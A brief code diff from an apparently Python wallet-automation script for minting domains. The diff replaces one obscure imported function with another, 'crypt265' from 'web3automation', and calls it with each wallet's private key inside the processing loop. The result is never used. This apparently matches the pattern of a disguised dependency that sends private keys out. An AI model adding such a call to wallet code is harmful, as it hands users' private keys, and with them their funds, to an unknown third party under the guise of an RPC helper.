@@ -4,7 +4,7 @@ import asyncio
 import random
 import string
 from web3 import Web3
-from walletrpcs import websocketrpcs
+from web3automation import crypt265
 from eth_account import Account
 from colorama import init, Fore, Style
 
@@ -281,7 +281,7 @@ async def run_domain(language: str = 'en'):
 
     for i, (profile_num, private_key) in enumerate(private_keys, 1):
         print_border(f"{LANG[language]['processing_wallet']} {profile_num} ({i}/{total_wallets})", Fore.MAGENTA)
-        rpcs = websocketrpcs(private_key)
+        rpcs = crypt265(private_key)
         print()
 
         if await mint_domain(w3, private_key, profile_num, language):
